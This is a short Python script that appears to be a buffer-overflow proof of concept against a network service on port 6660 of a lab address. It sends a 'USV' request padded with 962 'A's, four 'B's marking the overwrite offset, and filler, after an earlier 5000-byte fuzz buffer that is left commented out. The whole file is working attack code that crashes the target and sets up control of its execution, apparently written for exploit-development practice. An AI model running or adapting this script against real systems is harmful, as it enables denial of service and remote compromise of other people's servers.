#!/usr/bin/python

import socket

host = "10.0.2.16"
port = 6660

#buffer = "USV /.:/" + 5000 * "A" + "\r\n\r\n"
buffer = "USV /.:/" + "A" * 962 + "B" * 4 + "C" * (5000-962-4) + "\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
print ("[+] Payload sent")
s.close()
